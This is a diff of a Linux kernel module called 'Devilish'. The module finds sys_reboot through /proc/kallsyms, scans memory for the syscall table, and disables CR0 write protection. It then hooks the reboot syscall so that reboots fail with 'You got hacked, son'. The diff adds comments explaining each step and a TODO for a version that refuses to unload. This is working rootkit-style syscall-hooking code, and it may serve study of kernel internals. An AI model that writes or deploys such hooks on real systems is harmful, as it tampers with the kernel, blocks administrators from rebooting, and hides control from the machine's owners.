@@ -1,18 +1,17 @@
 #include <linux/init.h>
 #include <linux/kernel.h>
 #include <linux/module.h>
-#include <linux/slab.h>		// kmalloc()
-#include <linux/fs.h>		// file operation functions in kernel mode
-#include <linux/uaccess.h>	// userspace memory access functions (get/set_fs())
-#include <linux/string.h>	// necessary evil
+#include <linux/slab.h>		// Kernel slab allocation, kmalloc()
+#include <linux/fs.h>		// File operation functions in kernel mode
+#include <linux/uaccess.h>	// Needed for unpriveleged memory access
+#include <linux/string.h>	// We need this for sane string manipulation
 #include <linux/syscalls.h>	// System calls
-#include <linux/types.h>	// ULLONG_MAX
-#include <linux/linkage.h>	// asmlinkage
-#include <linux/delay.h>
+#include <linux/types.h>	// Just to get ULLONG_MAX
+#include <linux/linkage.h>	// Asmlinkage exports
 
-#include <asm/paravirt.h>	// write/read_cr0
-#include <asm/page.h>		// PAGE_OFFSET
-#include <asm/unistd.h>		// System call numbers
+#include <asm/paravirt.h>	// Functions to modify the CPU control register
+#include <asm/page.h>		// Exports PAGE_OFFSET
+#include <asm/unistd.h>		// System call identification numbers
 
 #ifndef MODULE_NAME
 #define MODULE_NAME "Devilish"
@@ -20,7 +19,9 @@
 #define MAX_LEN 256
 #define SYMBOLS "/proc/kallsyms"
 
-MODULE_AUTHOR("Mikael Heino");
+/* We should have an author. */
+MODULE_AUTHOR("Hackerman");
+/* We don't want to taint the kernel. */
 MODULE_LICENSE("Dual MIT/GPL");
 
 unsigned long *sys_reboot_address;
@@ -30,32 +31,47 @@ asmlinkage long (* orig_reboot) (int, int);
 
 asmlinkage long new_reboot(int a0, int a1)
 {
-	printk(KERN_EMERG "sys_reboot hooked!\n");
+	printk(KERN_EMERG "You got hacked, son\n");
 	return -EPERM;
 }
 
 static int find_address_sct(void)
 {
-	unsigned long offset = PAGE_OFFSET;	// Start of kernel RAM
+	/*
+	 * Dynamically acquire the kernel RAM base address, could start from 0
+	 * as well, but this skips potential wasted reads
+	 */
+	unsigned long offset = PAGE_OFFSET;
 
 	printk(KERN_INFO "sys_reboot_address = %p\n", sys_reboot_address);
 	printk(KERN_INFO "looking for sct address\n");
 	while (offset < ULLONG_MAX) {
 		sct = (unsigned long **)offset;
 
+		/* Pretend we have the syscall table and prod for address */
 		if (sct[__NR_reboot] == sys_reboot_address) {
+			/* We actually have it */
 			printk(KERN_INFO "found sct[__NR_reboot]");
 			return 0;
 		}
 
+		/* Increment the iterator with the size of one 'address' */
 		offset += sizeof(void *);
 	}
-	// Couldn't find it
+
+	/*
+	 * We couldn't find it. If we didn't find it the function takes ages to
+	 * complete anyways.
+	 */
 	return -1;
 }
 
 static int find_address_reboot(void)
 {
+	/*
+	 * Open /proc/kallsyms which contains all of the 'publicly' available
+	 * symbols. Search for the address of the desired syscall.
+	 */
 	struct file *fp = NULL;
 	int i = 0;
 	char buf[MAX_LEN];
@@ -72,6 +88,12 @@ static int find_address_reboot(void)
 
 	memset(buf, 0x0, MAX_LEN);
 	ptr = buf;
+
+	/*
+	 * The contents of kallsyms <address> <symbol type> <symbol name>
+	 * Example: ffffffffba09ef60 T add_range
+	 * 'T/t' = text/code
+	 */
 	while(kernel_read(fp, ptr+i, 1, &fp->f_pos) == 1) {
 		if (ptr[i] == '\n' || i == 255) {
 			i = 0;
@@ -85,7 +107,7 @@ static int find_address_reboot(void)
 					set_fs(fs_state);
 					return -1;
 				}
-				// Separate the address field from the string
+				/* Separate the address field from the string */
 				strncpy(tmp, strsep(&ptr, " "), MAX_LEN);
 				sys_reboot_address = (unsigned long *)
 						simple_strtoul(tmp, NULL, 16);
@@ -105,14 +127,22 @@ static int find_address_reboot(void)
 
 static int assign_hook(unsigned long **sct)
 {
-	write_cr0(read_cr0() & (~ 0x10000));		// Swap the ro flag to rw
-	orig_reboot = (void *) sct[__NR_reboot];	// save for later
-	sct[__NR_reboot] = (long *) new_reboot;	// assign our own function
+	/*
+	 * Modify the control register (cr0) value to permit writes to protected
+	 * memory. Save original function so we can reset when we clean up
+	 */
+	write_cr0(read_cr0() & (~ 0x10000));
+	orig_reboot = (void *) sct[__NR_reboot];
+	sct[__NR_reboot] = (long *) new_reboot;
 	write_cr0(read_cr0() | 0x10000);
 	return 0;
 }
 
 static int unassign_hook(void) {
+	/*
+	 * Since we are nice people we clean up our mess when exiting.
+	 * TODO: Version of the module that refuses to unload.
+	 */
 	write_cr0(read_cr0() & (~ 0x10000));
 	sct[__NR_reboot] = (void *) orig_reboot;
 	write_cr0(read_cr0() | 0x10000);
